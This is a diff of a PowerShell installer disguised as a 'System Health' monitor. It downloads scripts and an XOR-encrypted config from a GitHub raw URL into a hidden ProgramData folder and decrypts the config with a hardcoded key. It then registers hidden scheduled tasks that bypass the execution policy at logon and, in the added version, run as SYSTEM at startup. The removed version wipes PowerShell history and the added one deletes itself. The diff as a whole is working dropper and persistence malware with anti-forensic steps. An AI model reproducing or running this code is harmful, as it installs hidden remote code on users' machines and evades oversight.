@@ -1,10 +1,26 @@
-$ErrorActionPreference="Stop"
-$p="C:\ProgramData\SystemHealthService";$u="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1";$c="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc";$k="S3cr3tK3y2024!";$t="SystemHealthMonitor"
-if(!(Test-Path $p)){$null=New-Item -ItemType Directory -Path $p -Force};attrib +h $p 2>$null
-$w=New-Object System.Net.WebClient;$w.Headers.Add("User-Agent","PowerShell")
-[System.IO.File]::WriteAllText("$p\HealthMonitor.ps1",$w.DownloadString($u));attrib +h "$p\HealthMonitor.ps1" 2>$null
-$e=[Convert]::FromBase64String($w.DownloadString($c));$kb=[System.Text.Encoding]::UTF8.GetBytes($k);$d=New-Object byte[] $e.Length;for($i=0;$i -lt $e.Length;$i++){$d[$i]=$e[$i] -bxor $kb[$i % $kb.Length]};[System.IO.File]::WriteAllBytes("$p\config.json",$d);attrib +h "$p\config.json" 2>$null
-try{$null=schtasks /delete /tn $t /f 2>&1}catch{};try{Unregister-ScheduledTask -TaskName $t -Confirm:$false -EA SilentlyContinue}catch{}
-$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-W Hidden -NoP -EP Bypass -File `"$p\HealthMonitor.ps1`"";$tr=New-ScheduledTaskTrigger -AtLogon;$pr=New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -LogonType Interactive -RunLevel Highest;$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 0);Register-ScheduledTask -TaskName $t -Action $a -Trigger $tr -Principal $pr -Settings $s -Force|Out-Null
-Start-ScheduledTask -TaskName $t
-Clear-History -EA SilentlyContinue;Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA SilentlyContinue;exit
+$ErrorActionPreference="SilentlyContinue";$ProgressPreference="SilentlyContinue"
+$p="C:\ProgramData\SystemHealthService";$ek="S3cr3tK3y2024!"
+$eu="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc"
+$uu="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1"
+$au="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitorAdmin.ps1"
+if(!(Test-Path $p)){New-Item -Path $p -ItemType Directory -Force|Out-Null};(Get-Item $p).Attributes="Hidden"
+Invoke-WebRequest -Uri $eu -OutFile "$p\config.enc" -UseBasicParsing
+Invoke-WebRequest -Uri $uu -OutFile "$p\HealthMonitor.ps1" -UseBasicParsing
+Invoke-WebRequest -Uri $au -OutFile "$p\HealthMonitorAdmin.ps1" -UseBasicParsing
+$enc=[Convert]::FromBase64String((Get-Content "$p\config.enc" -Raw));$kb=[System.Text.Encoding]::UTF8.GetBytes($ek);$dec=New-Object byte[] $enc.Length;for($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor $kb[$i % $kb.Length]};[System.Text.Encoding]::UTF8.GetString($dec)|Out-File "$p\config.json" -Force
+Remove-Item "$p\config.enc" -Force
+(Get-Item "$p\config.json").Attributes="Hidden";(Get-Item "$p\HealthMonitor.ps1").Attributes="Hidden";(Get-Item "$p\HealthMonitorAdmin.ps1").Attributes="Hidden"
+try{schtasks /delete /tn "SystemHealthMonitor" /f 2>$null}catch{};try{schtasks /delete /tn "SystemHealthAdmin" /f 2>$null}catch{}
+$un=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$ua=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p\HealthMonitor.ps1`""
+$ut=New-ScheduledTaskTrigger -AtLogOn
+$us=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)
+$up=New-ScheduledTaskPrincipal -UserId $un -LogonType Interactive -RunLevel Highest
+Register-ScheduledTask -TaskName "SystemHealthMonitor" -Action $ua -Trigger $ut -Settings $us -Principal $up -Force|Out-Null
+$aa=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p\HealthMonitorAdmin.ps1`""
+$at=New-ScheduledTaskTrigger -AtStartup
+$as=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)
+$ap=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "SystemHealthAdmin" -Action $aa -Trigger $at -Settings $as -Principal $ap -Force|Out-Null
+Start-ScheduledTask -TaskName "SystemHealthMonitor";Start-ScheduledTask -TaskName "SystemHealthAdmin"
+Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
